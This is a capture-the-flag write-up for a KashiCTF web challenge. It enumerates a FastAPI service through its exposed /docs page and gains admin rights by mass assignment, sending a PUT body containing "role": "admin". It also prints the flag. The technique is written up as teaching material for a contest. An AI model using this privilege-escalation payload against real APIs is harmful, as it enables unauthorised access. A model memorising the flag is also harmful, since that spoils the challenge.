# SuperFastAPI

Total Solves - 189

Final Points - 100

## Description
Made my very first API! However I have to still integrate it with a frontend so can't do much at this point lol.

## Writeup

```shell
$ curl http://kashictf.iitbhucybersec.in:57490
{"message":"Welcome to my SuperFastAPI. No frontend tho - visit sometime later :)"}
```

The initial access doesn't give any information. However, the challenge name Super**FastAPI**, should make one think that maybe FastAPI is being used. The header `server: uvicorn` would furthur strengthen this belief.

It is popular knowledge that FastAPI serves three special endpoints:
- `/docs`
- `/redoc`
- `/openapi.json`

These endpoints explain the API and have interactive interface to test API. An attacker could use these to undertand the API, if a developer forgets to hide these before production release.

On visiting `/docs`, one will understand their are 5 API endpoints:
- `GET /`
- `GET /get/{username}`
- `POST /create/{username}`
- `PUT /update/{username}`
- `GET /flag/{username}`

The user has to interact with each to get to this conclusion:

### `GET /`

Serves the following message:
```json
{
  "message": "Welcome to my SuperFastAPI. No frontend tho - visit sometime later :)"
}
```
### `GET /get/{username}`

If no user with `username` exists, returns an error:
```json
{
  "error": "User not found"
}
```

If the user with `username` exists, returns the user details:
```json
{
  "message": {
    "fname": "user fname",
    "lname": "user lname",
    "email": "user email",
    "gender": "user gender",
    "role": "guest"
  }
}
```
### `POST /create/{username}`

Takes in following body parameters:
```json
{
  "fname": "user fname",
  "lname": "user lname",
  "email": "user email",
  "gender": "user gender"
}
```

If user with `username` exists, returns an error:
```json
{
  "error": "User already exists"
}
```

If no user with `username` exists, returns the success message:
```json
{
  "message": "User created!"
}
```

### `PUT /update/{username}`

Takes in following body parameters:
```json
{
  "fname": "user fname",
  "lname": "user lname",
  "email": "user email",
  "gender": "user gender"
}
```

If user with `username` doesn't exist, returns an error:
```json
{
  "error": "User not found"
}
```

If no user with `username` exists, returns the success message:
```json
{
  "message": "User created!"
}
```

### `GET /flag/{username}`

If user with `username` exists, returns an error:
```json
{
    "error": "Only for admin"
}
```

If user with `username` doesn't exist, returns an error:
```json
{
  "error": "User not found"
}
```

Now if you look closely, the `GET /get/{username}` endpoint reveals an extra parameter, `role`.
Maybe the developer doesn't actualy check the keys sent in the data, and directly assigns that to username? If we send a body with `"role": "admin"`, we can access `/flag/{username}`.

The following body is sent to `PUT /update/{username}`:
```json
{
  "fname": "John",
  "lname": "Doe",
  "email": "john.doe@example.com",
  "gender": "male",
  "role": "admin"
}
```

The endpoint `/get/{username}` returns the flag:
```json
{
  "message": "KashiCTF{m455_4551gnm3n7_ftw}"
}
```

## Flag
`KashiCTF{m455_4551gnm3n7_ftw_[a-zA-Z0-9]{9}}`